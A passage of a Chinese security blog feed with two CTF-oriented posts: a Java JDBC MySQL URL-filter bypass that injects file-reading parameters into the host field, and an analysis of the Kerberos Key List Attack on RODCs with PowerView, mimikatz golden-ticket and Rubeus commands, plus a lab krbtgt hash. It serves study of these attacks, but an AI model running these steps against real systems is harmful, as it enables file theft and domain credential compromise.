class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token constant">JDBC_MYSQL_PROTOCOL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token constant">JDBC_MATCH_REGEX</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token function">parseMysqlUrlParamsToMap</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> split <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token constant">AND_SYMBOL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span>split<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> str2 <span class="token operator">:</span> split<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> split2 <span class="token operator">=</span> str2<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token constant">EQUAL_SIGN</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>split2<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>split2<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> split2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> hashMap<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">parseParamsMapToMysqlParamUrl</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>map <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> map<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string">""</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">stream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>entry <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token constant">EQUAL_SIGN</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token class-name">CharSequence</span><span class="token punctuation">)</span> entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">Collectors</span><span class="token punctuation">.</span><span class="token function">joining</span><span class="token punctuation">(</span><span class="token constant">AND_SYMBOL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkParams</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>map <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> map<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> parseMysqlUrlParamsToMap <span class="token operator">=</span> <span class="token function">parseMysqlUrlParamsToMap</span><span class="token punctuation">(</span><span class="token class-name">URLDecoder</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token function">parseParamsMapToMysqlParamUrl</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            map<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span>parseMysqlUrlParamsToMap<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span><span class="token punctuation">></span></span> it <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> next <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> key <span class="token operator">=</span> next<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Object</span> value <span class="token operator">=</span> next<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">||</span> value <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    it<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNotSecurity</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"Invalid mysql connection parameters: "</span> <span class="token operator">+</span> <span class="token function">parseParamsMapToMysqlParamUrl</span><span class="token punctuation">(</span>map<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">UnsupportedEncodingException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"mysql connection cul decode error: "</span> <span class="token operator">+</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isNotSecurity</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span> <span class="token class-name">String</span> str2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> z <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> str3 <span class="token operator">=</span> <span class="token constant">MYSQL_SENSITIVE_PARAMS</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">StringUtils</span><span class="token punctuation">.</span><span class="token function">isBlank</span><span class="token punctuation">(</span>str3<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> split <span class="token operator">=</span> str3<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token constant">COMMA</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> length <span class="token operator">=</span> split<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNotSecurity</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> split<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                z <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                i<span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token operator">!</span>z<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isNotSecurity</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">,</span> <span class="token class-name">String</span> str2<span class="token punctuation">,</span> <span class="token class-name">String</span> str3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>str3<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span> str2<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>str3<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">checkUrlIsSafe</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Matcher</span> matcher <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token constant">BLACKLIST_REGEX</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"url contains blacklisted characters: "</span> <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span> sb<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string">"error occurred during url security check: "</span> <span class="token operator">+</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">appendMysqlForceParams</span><span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> map<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        map<span class="token punctuation">.</span><span class="token function">putAll</span><span class="token punctuation">(</span><span class="token function">parseMysqlUrlParamsToMap</span><span class="token punctuation">(</span><span class="token string">"allowLoadLocalInfile=false&amp;autoDeserialize=false&amp;allowLocalInfile=false&amp;allowUrlInLocalInfile=false"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>提示了 reason: not valid java name and contains not printable characters</p><h2 id="2-2-绕过WAF逻辑"><a href="#2-2-绕过WAF逻辑" class="headerlink" title="2.2 绕过WAF逻辑"></a>2.2 绕过WAF逻辑</h2><p>检查逻辑后可以发现 host 字段的正则 Reg 可以进行注入：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token string">"(?i)jdbc:(?i)(mysql)://([^:]+)(:[0-9]+)?(/[a-zA-Z0-9_-]*[\\.\\-]?)?"</span><span class="token punctuation">;</span></code></pre><ul><li><code>([^:]+)</code> 可以一直匹配所有非冒号字符串</li><li>通过 url 全字符编码可以绕过关键词匹配waf</li><li>可以使用 # 来忽略最后插入的安全策略</li></ul><p>按照上述描述将下列字段注入到 host 中，并使用 Fake_MySQL_Server 读取客户端文件即可</p><pre class="language-java" data-language="java"><code class="language-java">allowLoadLocalInfile<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>allowUrlInLocalInfile<span class="token operator">=</span><span class="token boolean">true</span><span class="token operator">&amp;</span>allowLoadLocalInfileInPath<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">&amp;</span>maxAllowedPacket<span class="token operator">=</span><span class="token number">655360</span></code></pre><p>flag 在环境变量中：</p><p><img src="image-7.png" alt="image-7.png"></p>]]></content>
      
      
      <categories>
          
          <category> Write Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos 中针对 RODC 的 Key List Attack 分析</title>
      <link href="/skill/kerberos-%E4%B8%AD%E9%92%88%E5%AF%B9-rodc-%E7%9A%84-key-list-attack-%E5%88%86%E6%9E%90/"/>
      <url>/skill/kerberos-%E4%B8%AD%E9%92%88%E5%AF%B9-rodc-%E7%9A%84-key-list-attack-%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>在 Kerberos 认证系统中，Key List Attack 是一种相对较新的攻击手段，主要针对只读域控制器（RODC）。这种攻击通过利用 Kerberos 协议中的特定扩展来实现，其核心在于请求和获取存储在 KDC 中的加密密钥信息。</p><h2 id="Kerberos-协议"><a href="#Kerberos-协议" class="headerlink" title="Kerberos 协议"></a>Kerberos 协议</h2><p>Kerberos 协议是一种基于票据的认证协议，允许节点在不安全网络中安全地证明其身份。Kerberos 的核心是 KDC，它负责发放和管理票据（Ticket-Granting Ticket，TGT）和服务票据（Service Ticket，ST）。本文不涉及 Kerberos 协议的基本原理，不熟悉 Kerberos 认证流程的读者，请先阅读 <a href="https://xz.aliyun.com/t/8187">https://xz.aliyun.com/t/8187</a> 学习相关内容。</p><h2 id="RODC-特性"><a href="#RODC-特性" class="headerlink" title="RODC 特性"></a>RODC 特性</h2><p>RODC 是一种特殊类型的域控制器，设计用于提高安全性和降低在安全级别较低的物理位置中的风险。RODC 不存储用户或其他帐户的密码哈希值；相反，它从完全域控制器（RWDC）请求所需的认证信息。RODC 对于存储敏感凭据的能力有严格限制，通过 <code>msDS-RevealOnDemandGroup</code> 和 <code>msDS-NeverRevealGroup</code> 控制这些限制。</p><ul><li><p>msDS-RevealOnDemandGroup<br>该属性作为一个安全组，它列出了那些可以在需求时由 RODC 请求其凭证的用户或计算机帐户。只有当这些帐户的验证请求被转发到 RODC 时，这些帐户的密码散列才会从主域控制器被请求并缓存在 RODC 上。此举措确保了 RODC 只存储那些可能需要频繁验证但不需要高安全级别保护的帐户凭据。</p></li><li><p>msDS-NeverRevealGroup<br>与 msDS-RevealOnDemandGroup 相对，该属性指定了一组帐户，其凭据即使是在请求时也决不应该被 RODC 请求或存储。这通常包括高权限帐户，如域管理员等。这一设置是为了防止在 RODC 遭到攻击时，攻击者能够获得对这些高权重帐户的控制。</p></li></ul><h2 id="Key-List-Request"><a href="#Key-List-Request" class="headerlink" title="Key List Request"></a>Key List Request</h2><p>在 Kerberos 协议中，Key List Request 是一种扩展请求，用于从密钥分发中心（KDC）获取一系列加密密钥，这些密钥与特定账户关联，并用于多种加密任务。这种请求特别在只读域控制器（RODC）环境中有其实际应用，因为 RODC 不存储所有用户的完整密钥信息，而是根据需要从全域控制器（RWDC）请求这些信息。</p><p>当客户端需要与服务进行安全通信时，它会发送一个包含 <code>KERB-KEY-LIST-REQ</code> padata 类型的 TGS-REQ （票据授权服务请求）消息到 KDC。这个请求指示 KDC 返回一系列支持的加密类型的密钥。KDC 响应这个请求，通过在 TGS-REP （票据授权服务响应）消息中包含 <code>KERB-KEY-LIST-REP</code> 结构，该结构嵌入在加密的 EncKDCRepPart 结构体中。这些返回的密钥信息通常用于兼容旧版本或特定加密需求。</p><pre class="language-none"><code class="language-none">KERB-KEY-LIST-REQ ::&#x3D; SEQUENCE OF Int32 -- encryption type -- KERB-KEY-LIST-REP ::&#x3D; SEQUENCE OF EncryptionKey</code></pre><h2 id="Key-List-Attack"><a href="#Key-List-Attack" class="headerlink" title="Key List Attack"></a>Key List Attack</h2><h3 id="1-RODC-管理权限的获取"><a href="#1-RODC-管理权限的获取" class="headerlink" title="1. RODC 管理权限的获取"></a>1. RODC 管理权限的获取</h3><p>首先攻击者需要获取对 RODC 的管理权限，这可以通过 PowerSploit 项目的 PowerView.ps1 修改 RODC 对象的 ManagedBy 属性实现，将其设置为攻击者控制的账户，这样攻击者就可以直接登入并管理 RODC：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'managedBy'</span>=<span class="token string">'CN=Hacker,CN=Users,DC=example,DC=com'</span><span class="token punctuation">&#125;</span></code></pre><h3 id="2-修改安全组策略"><a href="#2-修改安全组策略" class="headerlink" title="2. 修改安全组策略"></a>2. 修改安全组策略</h3><p>一旦控制了 RODC，攻击者可以修改关键的 Active Directory 属性，包括 msDS-NeverRevealGroup 和 msDS-RevealOnDemandGroup。通过这种修改，攻击者可以配置 RODC 来缓存并揭示通常不应被揭示的高权限用户凭证。</p><p>首先通过 PowerView.ps1 清空 msDS-NeverRevealGroup 属性：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span>Clear <span class="token string">'msDS-NeverRevealGroup'</span></code></pre><p>再通过 PowerView.ps1 将域管理员添加到 msDS-RevealOnDemandGroup 属性中：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=example,DC=com'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'msDS-RevealOnDemandGroup'</span>=@<span class="token punctuation">(</span><span class="token string">'CN=Administrator,CN=Users,DC=example,DC=com'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><h3 id="3-利用-Key-List-Request"><a href="#3-利用-Key-List-Request" class="headerlink" title="3. 利用 Key List Request"></a>3. 利用 Key List Request</h3><p>在 RODC 中配置完毕后，攻击者可以发起特定的 Key List Request，强制 RODC 从 RWDC 请求并获取目标高权限账户的密钥信息。通过为域管理员用户伪造黄金票据，来包含请求特定账户密钥的 KERB-KEY-LIST-REQ：</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 获取域信息</span>mimikatz.exe <span class="token string">"Log"</span> <span class="token string">"Privilege::Debug"</span> <span class="token string">"lsadump::lsa /patch"</span> <span class="token string">"exit"</span><span class="token comment"># 构造域管理员的黄金票据</span>mimikatz.exe kerberos::golden /admin:Administrator /domain:example.com /sid:sid /krbtgt:hash /ticket:ticket.kirbi<span class="token comment"># 请求 Key List</span>Rubeus.exe asktgs /enctype:rc4 /keyList /service:krbtgt/example.com /dc:dc.example.com /ticket:base64</code></pre><p>获取域管理员用户的哈希值后，攻击者可以用它来解密服务票据或其他敏感数据，甚至可能用它来伪造新的票据，进一步在网络中移动，提升权限，或执行其他恶意行为。</p><h2 id="赛题举例"><a href="#赛题举例" class="headerlink" title="赛题举例"></a>赛题举例</h2><p>CISCN 2024 Final 渗透部分 DC Challenge</p><p><img src="image-1.png" alt="alt text"></p><p>首先可从 WIN-OPS88 中获得 ROAdmins.xlsx 敏感文件，其中包含 RODC 的管理员账号密码，从而可以获得 RODC 的远程桌面</p><p><img src="image-2.png" alt="alt text"></p><p>使用 RODC 管理员账号密码连接远程桌面 RODC.vertexsoft.local</p><p><img src="image-3.png" alt="alt text"></p><p>获取对 RODC 的管理权限：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span><span class="token function">Set</span> @<span class="token punctuation">&#123;</span><span class="token string">'managedBy'</span>=<span class="token string">'CN=lsabellaTech,CN=Users,DC=vertex,DC=local'</span><span class="token punctuation">&#125;</span></code></pre><p>执行 <code>net user /domain</code> 发现可以枚举域内用户，表明现在具有 RODC 管理员权限：</p><p><img src="image-4.png" alt="alt text"></p><p>但此时没有访问 DC 文件系统的权限：</p><p><img src="image-5.png" alt="alt text"></p><p>获取域信息：</p><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz.exe <span class="token string">"Log"</span> <span class="token string">"Privilege::Debug"</span> <span class="token string">"lsadump::lsa /patch"</span> <span class="token string">"exit"</span></code></pre><p><img src="image-6.png" alt="alt text"></p><p><img src="image-7.png" alt="alt text"></p><p>获得信息如下：</p><pre class="language-none"><code class="language-none">domain：vertexsoft.localsid：S-1-5-21-1670446094-1728415802-1380520873krbtgt Hash NTLM：34e335179246ef930dc33fd1e3de6e9e</code></pre><p>清空 msDS-NeverRevealGroup 属性：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token punctuation">.</span>\PowerView<span class="token punctuation">.</span>ps1<span class="token function">Set-DomainObject</span> <span class="token operator">-</span>Identity <span class="token string">'CN=RODC,OU=Domain Controllers,DC=vertex,DC=local'</span> <span class="token operator">-</span>Clear <span class="token string">'msDS-NeverRevealGroup'</span></code></pre><p>将域管理员添加到 msDS-RevealOnDemandGroup 